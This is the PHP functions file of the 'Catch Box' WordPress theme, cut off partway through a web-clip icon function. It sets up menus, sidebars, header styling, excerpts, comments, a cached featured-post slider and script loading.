<?php
/**
 * Catch Box functions and definitions
 *
 * Sets up the theme and provides some helper functions. Some helper functions
 * are used in the theme as custom template tags. Others are attached to action and
 * filter hooks in WordPress to change core functionality.
 *
 * The first function, catchbox_setup(), sets up the theme by registering support
 * for various features in WordPress, such as post thumbnails, navigation menus, and the like.
 *
 * When using a child theme (see http://codex.wordpress.org/Theme_Development and
 * http://codex.wordpress.org/Child_Themes), you can override certain functions
 * (those wrapped in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before the parent
 * theme's file, so the child theme functions would be used.
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are instead attached
 * to a filter or action hook. The hook can be removed by using remove_action() or
 * remove_filter() and you can attach your own function to the hook.
 *
 * We can remove the parent theme's hook only after it is attached, which means we need to
 * wait until setting up the child theme:
 *
 * <code>
 * add_action( 'after_setup_theme', 'my_child_theme_setup' );
 * function my_child_theme_setup() {
 *     // We are providing our own filter for excerpt_length (or using the unfiltered value)
 *     remove_filter( 'excerpt_length', 'catchbox_excerpt_length' );
 *     ...
 * }
 * </code>
 *
 * For more information on hooks, actions, and filters, see http://codex.wordpress.org/Plugin_API.
 *
 * @package Catch Themes
 * @subpackage Catch_Box
 * @since Catch Box 1.0
 */


/**
 * Tell WordPress to run catchbox_setup() when the 'after_setup_theme' hook is run.
 */
add_action( 'after_setup_theme', 'catchbox_setup' );

if ( ! function_exists( 'catchbox_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 *
 * To override catchbox_setup() in a child theme, add your own catchbox_setup to your child theme's
 * functions.php file.
 *
 * @uses load_theme_textdomain() For translation/localization support.
 * @uses add_editor_style() To style the visual editor.
 * @uses add_theme_support() To add support for post thumbnails, automatic feed links,custom headers and backgrounds.
 * @uses register_nav_menus() To add support for navigation menus.
 * @uses register_default_headers() To register the default custom header images provided with the theme.
 * @uses set_post_thumbnail_size() To set a custom post thumbnail size.
 *
 * @since Catch Box 1.0
 */
function catchbox_setup() {

	/**
	 * Global content width.
	 *
	 * Set the content width based on the theme's design and stylesheet.
	 * making it large as we have template without sidebar which is large
	 */
	if ( ! isset( $content_width ) )
	$content_width = 818;
	
	/* Catch Box is now available for translation.
	 * Add your files into /languages/ directory.
	 * @see http://codex.wordpress.org/Function_Reference/load_theme_textdomain
	 */
	load_theme_textdomain( 'catchbox', get_template_directory() . '/languages' );
	
	$locale = get_locale();
    $locale_file = get_template_directory().'/languages/$locale.php';
    if (is_readable( $locale_file))
		require_once( $locale_file);

	/**
     * Add callback for custom TinyMCE editor stylesheets. (editor-style.css)
     * @see http://codex.wordpress.org/Function_Reference/add_editor_style
     */
	add_editor_style();
	
	// Load up our theme options page and related code.
	require( get_template_directory() . '/inc/theme-options.php' );
	
	// Grab Catch Box's Adspace Widget.
	require( get_template_directory() . '/inc/widgets.php' );

	// Add default posts and comments RSS feed links to <head>.
	add_theme_support( 'automatic-feed-links' );

	/**
     * This feature enables custom-menus support for a theme.
     * @see http://codex.wordpress.org/Function_Reference/register_nav_menus
     */		
	register_nav_menus(array(
		'primary' 	=> __( 'Primary Menu', 'catchbox' ),
	   	'secondary'	=> __( 'Secondary Menu', 'catchbox' ),
		'footer'	=> __( 'Footer Menu', 'catchbox' )
	) );

	/**
     * This feature enables Jetpack plugin Infinite Scroll
     */		
    add_theme_support( 'infinite-scroll', array(
		'type'           => 'click',										
        'container'      => 'content',
        'footer_widgets' => array( 'sidebar-2', 'sidebar-3', 'sidebar-4' ),
        'footer'         => 'page',
    ) );
	
	// Add support for custom backgrounds
	add_theme_support( 'custom-background' ); 

	/**
     * This feature enables post-thumbnail support for a theme.
     * @see http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
     */
	add_theme_support( 'post-thumbnails' );

	// The next four constants set how Catch Boxsupports custom headers.

	// The default header text color
	define( 'HEADER_TEXTCOLOR', '000' );

	// By leaving empty, we allow for random image rotation.
	define( 'HEADER_IMAGE', '' );

	// The height and width of your custom header used for site logo.
	// Add a filter to catchbox_header_image_width and catchbox_header_image_height to change these values.
	define( 'HEADER_IMAGE_WIDTH', apply_filters( 'catchbox_header_image_width', 300 ) );
	define( 'HEADER_IMAGE_HEIGHT', apply_filters( 'catchbox_header_image_height', 125 ) );

	// We'll be using post thumbnails for custom header images for logos.
	// We want them to be the size of the header image that we just defined
	// Larger images will be auto-cropped to fit, smaller ones will be ignored. See header.php.
	set_post_thumbnail_size( HEADER_IMAGE_WIDTH, HEADER_IMAGE_HEIGHT, true );

	// Add Catch Box's custom image sizes
	add_image_size( 'featured-header', HEADER_IMAGE_WIDTH, HEADER_IMAGE_HEIGHT, true ); // Used for logo (header) images
	
	//disable old image size for featued posts add_image_size( 'featured-slider', 560, 270, true );
	add_image_size( 'featured-slider', 644, 320, true ); // Used for featured posts if a large-feature doesn't exist

	// Add support for custom header	
	add_theme_support( 'custom-header', array( 
		// Header image random rotation default
		'random-default'			=> false,
		// Header image flex width
		'flex-width'      			=> true,
		// Header image flex height
		'flex-height'				=> true,
		// Template header style callback
		'wp-head-callback'			=> 'catchbox_header_style',
		// Admin header style callback
		'admin-head-callback'		=> 'catchbox_admin_header_style',
		// Admin preview style callback
		'admin-preview-callback'	=> 'catchbox_admin_header_image'
	) );

	// Default custom headers packaged with the theme. %s is a placeholder for the theme template directory URI.
	register_default_headers( array(
		'wheel' => array(
			'url' => '%s/images/headers/garden.jpg',
			'thumbnail_url' => '%s/images/headers/garden-thumbnail.jpg',
			/* translators: header image description */
			'description' => __( 'Garden', 'catchbox' )
		),
		'shore' => array(
			'url' => '%s/images/headers/flower.jpg',
			'thumbnail_url' => '%s/images/headers/flower-thumbnail.jpg',
			/* translators: header image description */
			'description' => __( 'Flower', 'catchbox' )
		),
		'trolley' => array(
			'url' => '%s/images/headers/mountain.jpg',
			'thumbnail_url' => '%s/images/headers/mountain-thumbnail.jpg',
			/* translators: header image description */
			'description' => __( 'Mountain', 'catchbox' )
		),
	) );

}
endif; // catchbox_setup


if ( ! function_exists( 'catchbox_header_style' ) ) :
/**
 * Styles the header image and text displayed on the blog
 *
 * @since Catch Box 1.0
 */
function catchbox_header_style() {

	$text_color = get_header_textcolor();
	
	// If no custom options for text are set, let's bail.
	if ( $text_color == HEADER_TEXTCOLOR )
		return;

	// If we get this far, we have custom styles. Let's do this.
	?>
	<style type="text/css">
	<?php
		// Has the text been hidden?
		if ( 'blank' == $text_color ) :
	?>
		#site-title,
		#site-description {
			position: absolute !important;
			clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
			clip: rect(1px, 1px, 1px, 1px);
		}
	<?php 
	
		// If the user has set a custom color for the text use that
		else :
	?>
		#site-title a,
		#site-description {
			color: #<?php echo get_header_textcolor(); ?>;
		}
	<?php endif; ?>
	</style>
	<?php
}
endif; // catchbox_header_style


if ( ! function_exists( 'catchbox_admin_header_style' ) ) :
/**
 * Styles the header image displayed on the Appearance > Header admin panel.
 *
 * @since Catch Box 1.0
 */
function catchbox_admin_header_style() {
?>
	<style type="text/css">
	.appearance_page_custom-header #headimg {
		border: none;
	}
	#headimg h1,
	#desc {
		font-family: "Helvetica Neue", Arial, Helvetica, "Nimbus Sans L", sans-serif;
	}
	#headimg h1 {
		margin: 0;
	}
	#headimg h1 a {
		font-size: 32px;
		line-height: 36px;
		text-decoration: none;
	}
	#desc {
		font-size: 14px;
		line-height: 23px;
		padding: 0 0 3em;
	}
	<?php
		// If the user has set a custom color for the text use that
		if ( get_header_textcolor() != HEADER_TEXTCOLOR ) :
	?>
		#site-title a,
		#site-description {
			color: #<?php echo get_header_textcolor(); ?>;
		}
	<?php endif; ?>

	#headimg img {
		height: auto;
		max-width: 100%;
	}
	</style>
<?php
}
endif; // catchbox_admin_header_style


if ( ! function_exists( 'catchbox_admin_header_image' ) ) :
/**
 * Custom header image markup displayed on the Appearance > Header admin panel.
 *
 * @since Catch Box 1.0
 */
function catchbox_admin_header_image() { ?>
	<div id="headimg">
		<?php
		$color = get_header_textcolor();
		$image = get_header_image();
		if ( $color && $color != 'blank' )
			$style = ' style="color:#' . $color . '"';
		else
			$style = ' style="display:none"';
		?>
		
		<h1><a id="name"<?php echo $style; ?> onclick="return false;" href="<?php echo esc_url( home_url( '/' ) ); ?>"><?php bloginfo( 'name' ); ?></a></h1>
		<div id="desc"<?php echo $style; ?>><?php bloginfo( 'description' ); ?></div>
		<?php if ( $image ) : ?>
			<img src="<?php echo esc_url( $image ); ?>" alt="" />
		<?php endif; ?>
	</div>
<?php }
endif; // catchbox_admin_header_image


if ( ! function_exists( 'catchbox_filter_wp_title' ) ) :
/**
 * Creates a nicely formatted and more specific title element text
 * for output in head of document, based on current view.
 *
 * @param string $title Default title text for current view.
 * @param string $sep Optional separator.
 * @return string Filtered title.
 */
function catchbox_filter_wp_title( $title, $sep ) {
	global $page, $paged;

	if ( is_feed() )
		return $title;

	// Add the site name.
	$title .= get_bloginfo( 'name' );

	// Add the site description for the home/front page.
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		$title = "$title $sep $site_description";

	// Add a page number if necessary.
	if ( $paged >= 2 || $page >= 2 )
		$title = "$title $sep " . sprintf( __( 'Page %s', 'catchbox' ), max( $paged, $page ) );

	return $title;	

}
endif; // catchbox_filter_wp_title

add_filter( 'wp_title', 'catchbox_filter_wp_title', 10, 2 );


/**
 * Sets the post excerpt length.
 *
 * To override this length in a child theme, remove the filter and add your own
 * function tied to the excerpt_length filter hook.
 */
function catchbox_excerpt_length( $length ) {
	$options = catchbox_get_theme_options();
	if( empty( $options['excerpt_length'] ) )
		$options = catchbox_get_default_theme_options();
		
	$length = $options['excerpt_length'];
	return $length;
}
add_filter( 'excerpt_length', 'catchbox_excerpt_length' );


if ( ! function_exists( 'catchbox_continue_reading_link' ) ) :
/**
 * Returns a "Continue Reading" link for excerpts
 */
function catchbox_continue_reading_link() {
	return ' <a class="more-link" href="'. esc_url( get_permalink() ) . '">' . __( 'Continue reading <span class="meta-nav">&rarr;</span>', 'catchbox' ) . '</a>';
}
endif;


/**
 * Replaces "[...]" (appended to automatically generated excerpts) with an ellipsis and catchbox_continue_reading_link().
 *
 * To override this in a child theme, remove the filter and add your own
 * function tied to the excerpt_more filter hook.
 */
function catchbox_auto_excerpt_more( $more ) {
	return catchbox_continue_reading_link();
}
add_filter( 'excerpt_more', 'catchbox_auto_excerpt_more' );


/**
 * Adds a pretty "Continue Reading" link to custom post excerpts.
 *
 * To override this link in a child theme, remove the filter and add your own
 * function tied to the get_the_excerpt filter hook.
 */
function catchbox_custom_excerpt_more( $output ) {
	if ( has_excerpt() && ! is_attachment() ) {
		$output .= catchbox_continue_reading_link();
	}
	return $output;
}
add_filter( 'get_the_excerpt', 'catchbox_custom_excerpt_more' );


/**
 * Get our wp_nav_menu() fallback, wp_page_menu(), to show a home link.
 */
function catchbox_page_menu_args( $args ) {
	$args['show_home'] = true;
	return $args;
}
add_filter( 'wp_page_menu_args', 'catchbox_page_menu_args' );


/**
 * Replacing classes in default wp_page_menu
 *
 * REPLACE "current_page_item" WITH CLASS "current-menu-item"
 */
function catchbox_page_menu_active( $text ) {
	$replace = array(
		// List of classes to replace with "active"
		'current_page_item' => 'current-menu-item'
	);
	$text = str_replace(array_keys($replace), $replace, $text);
		return $text;
}
add_filter ( 'wp_page_menu', 'catchbox_page_menu_active' );


if ( ! function_exists( 'catchbox_widgets_init' ) ):
/**
 * Register our sidebars and widgetized areas.
 *
 * @since Catch Box 1.0
 */
function catchbox_widgets_init() {
	
	register_widget( 'catchbox_adwidget' );

	register_sidebar( array(
		'name' => __( 'Main Sidebar', 'catchbox' ),
		'id' => 'sidebar-1',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => "</aside>",
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

	register_sidebar( array(
		'name' => __( 'Footer Area One', 'catchbox' ),
		'id' => 'sidebar-2',
		'description' => __( 'An optional widget area for your site footer', 'catchbox' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => "</aside>",
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

	register_sidebar( array(
		'name' => __( 'Footer Area Two', 'catchbox' ),
		'id' => 'sidebar-3',
		'description' => __( 'An optional widget area for your site footer', 'catchbox' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => "</aside>",
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

	register_sidebar( array(
		'name' => __( 'Footer Area Three', 'catchbox' ),
		'id' => 'sidebar-4',
		'description' => __( 'An optional widget area for your site footer', 'catchbox' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => "</aside>",
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
}
endif; // catchbox_widgets_init

add_action( 'widgets_init', 'catchbox_widgets_init' );


if ( ! function_exists( 'catchbox_content_nav' ) ) : 
/**
 * Display navigation to next/previous pages when applicable
 */
function catchbox_content_nav( $nav_id ) {
	global $wp_query;
	
	/**
	 * Check Jetpack Infinite Scroll
	 * if it's active then disable pagination
	 */
	if ( class_exists( 'Jetpack', false ) ) {
		$jetpack_active_modules = get_option('jetpack_active_modules');
		if ( $jetpack_active_modules && in_array( 'infinite-scroll', $jetpack_active_modules ) ) {
			return false;
		}
	}

	if ( $wp_query->max_num_pages > 1 ) {  ?>  
		<nav id="<?php echo $nav_id; ?>">
			<h3 class="assistive-text"><?php _e( 'Post navigation', 'catchbox' ); ?></h3>
			<?php if ( function_exists('wp_pagenavi' ) )  { 
				wp_pagenavi();
			}
			elseif ( function_exists('wp_page_numbers' ) ) { 
				wp_page_numbers();
			}
			else { ?>	
				<div class="nav-previous"><?php next_posts_link( __( '<span class="meta-nav">&larr;</span> Older posts', 'catchbox' ) ); ?></div>
				<div class="nav-next"><?php previous_posts_link( __( 'Newer posts <span class="meta-nav">&rarr;</span>', 'catchbox' ) ); ?></div>
			<?php 
			} ?>
		</nav><!-- #nav -->
		<?php 
	}
	
}
endif; // catchbox_content_nav


if ( ! function_exists( 'catchbox_content_query_nav' ) ) :
/**
 * Display navigation to next/previous pages when applicable
 */
function catchbox_content_query_nav( $nav_id ) {
	global $wp_query;
	
	if ( $wp_query->max_num_pages > 1 ) { ?>
		<nav id="<?php echo $nav_id; ?>">
        	<h3 class="assistive-text"><?php _e( 'Post navigation', 'catchbox' ); ?></h3>
			<?php if ( function_exists('wp_pagenavi' ) )  { 
                wp_pagenavi();
            }
            elseif ( function_exists('wp_page_numbers' ) ) { 
                wp_page_numbers();
            }
            else { ?>	
            	<div class="nav-previous"><?php next_posts_link( __( '<span class="meta-nav">&larr;</span> Older posts', 'catchbox' ) ); ?></div>
                <div class="nav-next"><?php previous_posts_link( __( 'Newer posts <span class="meta-nav">&rarr;</span>', 'catchbox' ) ); ?></div>
            <?php 
            } ?>
		</nav><!-- #nav -->
	<?php 
	}
}
endif; // catchbox_content_nav


/**
 * Return the URL for the first link found in the post content.
 *
 * @since Catch Box 1.0
 * @return string|bool URL or false when no link is present.
 */
function catchbox_url_grabber() {
	if ( ! preg_match( '/<a\s[^>]*?href=[\'"](.+?)[\'"]/is', get_the_content(), $matches ) )
		return false;

	return esc_url_raw( $matches[1] );
}


if ( ! function_exists( 'catchbox_footer_sidebar_class' ) ):
/**
 * Count the number of footer sidebars to enable dynamic classes for the footer
 */
function catchbox_footer_sidebar_class() {
	$count = 0;

	if ( is_active_sidebar( 'sidebar-2' ) )
		$count++;

	if ( is_active_sidebar( 'sidebar-3' ) )
		$count++;

	if ( is_active_sidebar( 'sidebar-4' ) )
		$count++;

	$class = '';

	switch ( $count ) {
		case '1':
			$class = 'one';
			break;
		case '2':
			$class = 'two';
			break;
		case '3':
			$class = 'three';
			break;
	}

	if ( $class )
		echo 'class="' . $class . '"';
}
endif; // catchbox_footer_sidebar_class


if ( ! function_exists( 'catchbox_comment' ) ) :
/**
 * Template for comments and pingbacks.
 *
 * To override this walker in a child theme without modifying the comments template
 * simply create your own catchbox_comment(), and that function will be used instead.
 *
 * Used as a callback by wp_list_comments() for displaying the comments.
 *
 * @since Catch Box 1.0
 */
function catchbox_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case 'pingback' :
		case 'trackback' :
	?>
	<li class="post pingback">
		<p><?php _e( 'Pingback:', 'catchbox' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( __( 'Edit', 'catchbox' ), '<span class="edit-link">', '</span>' ); ?></p>
	<?php
			break;
		default :
	?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<article id="comment-<?php comment_ID(); ?>" class="comment">
			<footer class="comment-meta">
				<div class="comment-author vcard">
					<?php
						$avatar_size = 68;
						if ( '0' != $comment->comment_parent )
							$avatar_size = 39;

						echo get_avatar( $comment, $avatar_size );

						/* translators: 1: comment author, 2: date and time */
						printf( __( '%1$s on %2$s <span class="says">said:</span>', 'catchbox' ),
							sprintf( '<span class="fn">%s</span>', get_comment_author_link() ),
							sprintf( '<a href="%1$s"><time pubdate datetime="%2$s">%3$s</time></a>',
								esc_url( get_comment_link( $comment->comment_ID ) ),
								get_comment_time( 'c' ),
								/* translators: 1: date, 2: time */
								sprintf( __( '%1$s at %2$s', 'catchbox' ), get_comment_date(), get_comment_time() )
							)
						);
					?>

					<?php edit_comment_link( __( 'Edit', 'catchbox' ), '<span class="edit-link">', '</span>' ); ?>
				</div><!-- .comment-author .vcard -->

				<?php if ( $comment->comment_approved == '0' ) : ?>
					<em class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.', 'catchbox' ); ?></em>
					<br />
				<?php endif; ?>

			</footer>

			<div class="comment-content"><?php comment_text(); ?></div>

			<div class="reply">
				<?php comment_reply_link( array_merge( $args, array( 'reply_text' => __( 'Reply <span>&darr;</span>', 'catchbox' ), 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
			</div><!-- .reply -->
		</article><!-- #comment-## -->

	<?php
			break;
	endswitch;
}
endif; // catchbox_comment


if ( ! function_exists( 'catchbox_posted_on' ) ) : 
/**
 * Prints HTML with meta information for the current post-date/time and author.
 * Create your own catchbox_posted_on to override in a child theme
 *
 * @since Catch Box 1.0
 */
function catchbox_posted_on() {
	printf( __( '<span class="sep">Posted on </span><a href="%1$s" title="%2$s" rel="bookmark"><time class="entry-date updated" datetime="%3$s" pubdate>%4$s</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="%5$s" title="%6$s" rel="author">%7$s</a></span></span>', 'catchbox' ),
		esc_url( get_permalink() ),
		esc_attr( get_the_time() ),
		esc_attr( get_the_date( 'c' ) ),
		esc_html( get_the_date() ),
		esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
		esc_attr( sprintf( __( 'View all posts by %s', 'catchbox' ), get_the_author() ) ),
		get_the_author()
	);
}
endif; // catchbox_posted_on


if ( ! function_exists( 'catchbox_body_classes' ) ) : 
/**
 * Adds two classes to the array of body classes.
 * The first is if the site has only had one author with published posts.
 * The second is if a singular post being displayed
 *
 * @since Catch Box 1.0
 */
function catchbox_body_classes( $classes ) {
	$options = catchbox_get_theme_options();
	$layout = $options['theme_layout'];
	if ( function_exists( 'is_multi_author' ) && !is_multi_author() ) {
		$classes[] = 'single-author';
	}
	if ( $layout == 'content-sidebar' && !is_page_template( 'page-disable-sidebar.php' ) && !is_page_template( 'page-fullwidth.php' )  && !is_page_template( 'page-onecolumn.php' ) ) {
		$classes[] = 'content-sidebar';
	}
	elseif ( $layout == 'sidebar-content' && !is_page_template( 'page-disable-sidebar.php' ) && !is_page_template( 'page-fullwidth.php' )  && !is_page_template( 'page-onecolumn.php' ) ) {
		$classes[] = 'sidebar-content';
	}
	elseif ( $layout == 'content-onecolumn' || is_page_template( 'page-onecolumn.php' ) && !is_page_template( 'page-disable-sidebar.php' ) && !is_page_template( 'page-fullwidth.php' ) ) {
		$classes[] = 'content-onecolumn';
	}		
	elseif ( is_page_template( 'page-disable-sidebar.php' ) || is_attachment() ) {
		$classes[] = 'singular';
	}
	elseif ( is_page_template( 'page-fullwidth.php' ) || is_attachment() ) {
		$classes[] = 'fullwidth';	
	}	
	return $classes;
}
endif; // catchbox_body_classes

add_filter( 'body_class', 'catchbox_body_classes' );


/**
 * Adds in post ID when viewing lists of posts 
 * This will help the admin to add the post ID in featured slider
 * 
 * @param mixed $post_columns
 * @return post columns
 */
function catchbox_post_id_column( $post_columns ) {
	$beginning = array_slice( $post_columns, 0 ,1 );
	$beginning[ 'postid' ] = __( 'ID', 'catchbox'  );
	$ending = array_slice( $post_columns, 1 );
	$post_columns = array_merge( $beginning, $ending );
	return $post_columns;
}
add_filter( 'manage_posts_columns', 'catchbox_post_id_column' );

function catchbox_posts_id_column( $col, $val ) {
	if( $col == 'postid' ) echo $val;
}
add_action( 'manage_posts_custom_column', 'catchbox_posts_id_column', 10, 2 );

function catchbox_posts_id_column_css() {
	echo '<style type="text/css">#postid { width: 50px; }</style>';
}
add_action( 'admin_head-edit.php', 'catchbox_posts_id_column_css' );


/**
 * Function to pass the variables for php to js file.
 * This funcition passes the slider effect variables.
 */
function catchbox_pass_slider_value() {
	$options = get_option( 'catchbox_options_slider' );
	if( !isset( $options[ 'transition_effect' ] ) ) {
		$options[ 'transition_effect' ] = "fade";
	}
	if( !isset( $options[ 'transition_delay' ] ) ) {
		$options[ 'transition_delay' ] = 4;
	}
	if( !isset( $options[ 'transition_duration' ] ) ) {
		$options[ 'transition_duration' ] = 1;
	}
	$transition_effect = $options[ 'transition_effect' ];
	$transition_delay = $options[ 'transition_delay' ] * 1000;
	$transition_duration = $options[ 'transition_duration' ] * 1000;
	wp_localize_script( 
		'catchbox_slider',
		'js_value',
		array(
			'transition_effect' => $transition_effect,
			'transition_delay' => $transition_delay,
			'transition_duration' => $transition_duration
		)
	);
}//catchbox_pass_slider_value


if ( ! function_exists( 'catchbox_sliders' ) ) :
/**
 * This function to display featured posts on index.php
 *
 * @get the data value from theme options
 * @displays on the index
 *
 * @useage Featured Image, Title and Content of Post
 *
 * @uses set_transient and delete_transient
 */
function catchbox_sliders() {	
	global $post;
	
	//delete_transient( 'catchbox_sliders' );
		
	// get data value from catchbox_options_slider through theme options
	$options = get_option( 'catchbox_options_slider' );
	// get slider_qty from theme options
	$postperpage = $options[ 'slider_qty' ];
		
	if( ( !$catchbox_sliders = get_transient( 'catchbox_sliders' ) ) && !empty( $options[ 'featured_slider' ] ) ) {
		echo '<!-- refreshing cache -->';
	
		$catchbox_sliders = '
		<div id="slider">
			<section id="slider-wrap">';
			$get_featured_posts = new WP_Query( array(
				'posts_per_page' => $postperpage,
				'post__in'		 => $options[ 'featured_slider' ],
				'orderby' 		 => 'post__in',
				'ignore_sticky_posts' => 1 // ignore sticky posts
			));
				
			$i=0; while ( $get_featured_posts->have_posts()) : $get_featured_posts->the_post(); $i++;
				$title_attribute = esc_attr( apply_filters( 'the_title', get_the_title( $post->ID ) ) );
				
				if ( $i == 1 ) { $classes = "slides displayblock"; } else { $classes = "slides displaynone"; }
				$catchbox_sliders .= '
				<div class="'.$classes.'">
					<a href="'.get_permalink().'" title="'.sprintf( esc_attr__( 'Permalink to %s', 'catchbox' ), the_title_attribute( 'echo=0' ) ).'" rel="bookmark">
							'.get_the_post_thumbnail( $post->ID, 'featured-slider', array( 'title' => $title_attribute, 'alt' => $title_attribute, 'class'	=> 'pngfix' ) ).'
					</a>
					<div class="featured-text">'
						.the_title( '<span class="slider-title">','</span>', false ).' <span class="sep">:</span>
						<span class="slider-excerpt">'.get_the_excerpt().'</span>
					</div><!-- .featured-text -->
				</div> <!-- .slides -->';
			endwhile; wp_reset_query();
		$catchbox_sliders .= '
			</section> <!-- .slider-wrap -->
			<nav id="nav-slider">
				<div class="nav-previous"><img class="pngfix" src="'.get_template_directory_uri().'/images/previous.png" alt="next slide"></div>
				<div class="nav-next"><img class="pngfix" src="'.get_template_directory_uri().'/images/next.png" alt="next slide"></div>
			</nav>
		</div> <!-- #featured-slider -->';
		set_transient( 'catchbox_sliders', $catchbox_sliders, 86940 );
	}
	echo $catchbox_sliders;	
}
endif;  // catchbox_sliders 


if ( ! function_exists( 'catchbox_scripts_method' ) ):
/**
 * Register jquery scripts
 *
 * @register jquery cycle and custom-script
 * hooks action wp_enqueue_scripts
 */
function catchbox_scripts_method() {
	global $post;	
	
	//Register JQuery circle all and JQuery set up as dependent on Jquery-cycle
	wp_register_script( 'jquery-cycle', get_template_directory_uri() . '/js/jquery.cycle.all.min.js', array( 'jquery' ), '2.9999.5', true );
	
	//Enqueue Slider Script only in Front Page
	if ( is_front_page() || is_home() ) {
		wp_enqueue_script( 'catchbox_slider', get_template_directory_uri() . '/js/catchbox_slider.js', array( 'jquery-cycle' ), '1.0', true );
	}
	
	//Responsive Menu
	wp_register_script('catchbox-menu', get_template_directory_uri() . '/js/catchbox-menu.min.js', array('jquery'), '1.1.0', true);
	wp_register_script('catchbox-allmenu', get_template_directory_uri() . '/js/catchbox-allmenu-min.js', array('jquery'), '201301503', true);
	
	//Check is secondayand footer menu is enable or not
	$options = catchbox_get_theme_options();
	if ( !empty ($options ['enable_menus'] ) ) :
		wp_enqueue_script( 'catchbox-allmenu' );
	else :
		wp_enqueue_script( 'catchbox-menu' );
	endif;
	
	/**
	 * Adds JavaScript to pages with the comment form to support
	 * sites with threaded comments (when in use).
	 */
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}	

	// Loads our main stylesheet.
	wp_enqueue_style( 'catchbox-style', get_stylesheet_uri() );

	//Browser Specific Enqueue Script i.e. for IE 1-6
	$catchbox_ua = strtolower($_SERVER['HTTP_USER_AGENT']);
	if(preg_match('/(?i)msie [1-6]/',$catchbox_ua)) {
		wp_enqueue_script( 'catchbox-pngfix', get_template_directory_uri() . '/js/pngfix.min.js' );	  
	}

	//browser specific queuing i.e. for IE 1-8
	if(preg_match('/(?i)msie [1-8]/',$catchbox_ua)) {
	 	wp_enqueue_script( 'catchbox-html5', get_template_directory_uri() . '/js/html5.min.js' );
	}
	
}
endif; // catchbox_scripts_method

add_action( 'wp_enqueue_scripts', 'catchbox_scripts_method' );


if ( ! function_exists( 'catchbox_alter_home' ) ):
/**
 * Alter the query for the main loop in home page
 * @uses pre_get_posts hook
 */
function catchbox_alter_home( $query ) {
	$options = get_option( 'catchbox_options_slider' );
	if( !isset( $options[ 'exclude_slider_post' ] ) ) {
 		$options[ 'exclude_slider_post' ] = "0";
 	}
    if ( $options[ 'exclude_slider_post'] != "0" && !empty( $options[ 'featured_slider' ] ) ) {
		if( $query->is_main_query() && $query->is_home() ) {
			$query->query_vars['post__not_in'] = $options[ 'featured_slider' ];

		}
	}
}
endif; // catchbox_alter_home
add_action( 'pre_get_posts','catchbox_alter_home' );


/**
 * Remove div from wp_page_menu() and replace with ul.
 * @uses wp_page_menu filter
 */
function catchbox_wp_page_menu( $page_markup ) {
    preg_match('/^<div class=\"([a-z0-9-_]+)\">/i', $page_markup, $matches);
        $divclass = $matches[1];
        $replace = array('<div class="'.$divclass.'">', '</div>');
        $new_markup = str_replace($replace, '', $page_markup);
        $new_markup = preg_replace('/^<ul>/i', '<ul class="'.$divclass.'">', $new_markup);
        return $new_markup; }

add_filter( 'wp_page_menu', 'catchbox_wp_page_menu' );


if ( ! function_exists( 'catchbox_comment_form_fields' ) ) :
/**
 * Altering Comment Form Fields
 * @uses comment_form_default_fields filter
 */
function catchbox_comment_form_fields( $fields ) {
	$req = get_option( 'require_name_email' );
	$aria_req = ( $req ? " aria-required='true'" : '' );
	$commenter = wp_get_current_commenter();
    $fields['author'] = '<p class="comment-form-author"><label for="author">' . esc_attr__( 'Name', 'catchbox' ) . '</label> ' . ( $req ? '<span class="required">*</span>' : '' ) .
        '<input id="author" name="author" type="text" value="' . esc_attr( $commenter['comment_author'] ) . '" size="30"' . $aria_req . ' /></p>';
    $fields['email'] = '<p class="comment-form-email"><label for="email">' . esc_attr__( 'Email', 'catchbox' ) . '</label> ' . ( $req ? '<span class="required">*</span>' : '' ) .
        '<input id="email" name="email" type="text" value="' . esc_attr(  $commenter['comment_author_email'] ) . '" size="30"' . $aria_req . ' /></p>'; 
    return $fields;
}
endif; // catchbox_comment_form_fields

add_filter( 'comment_form_default_fields', 'catchbox_comment_form_fields' );


/**
 * Get the favicon Image from theme options
 *
 * @uses favicon 
 * @get the data value of image from theme options
 * @display favicon
 *
 * @uses set_transient and delete_transient 
 */
function catchbox_favicon() {
	//delete_transient( 'catchbox_favicon' );	
	
	if ( !$catchbox_favicon = get_transient( 'catchbox_favicon' ) ) {
		
		$options = catchbox_get_theme_options();
		
		if ( !empty( $options['fav_icon'] ) )  {
			$catchbox_favicon = '<link rel="shortcut icon" href="'.esc_url( $options[ 'fav_icon' ] ).'" type="image/x-icon" />'; 	
		}
		
		set_transient( 'catchbox_favicon', $catchbox_favicon, 86940 );
		
	}
	
	echo $catchbox_favicon ;	
	
}

//Load Favicon in Header Section
add_action('wp_head', 'catchbox_favicon');

//Load Favicon in Admin Section
add_action( 'admin_head', 'catchbox_favicon' );


/**
 * Get the Web Click Icon from theme options
 *
 * @uses web clip 
 * @get the data value of image from theme options
 * @display web clip
 *
 * @uses set_transient and delete_transient 
 */
function catchbox_webclip() {
	//delete_transient( 'catchbox_webclip' );	
	
	if ( !$catchbox_webclip = get_transient( 'catchbox_webclip' ) ) {
		
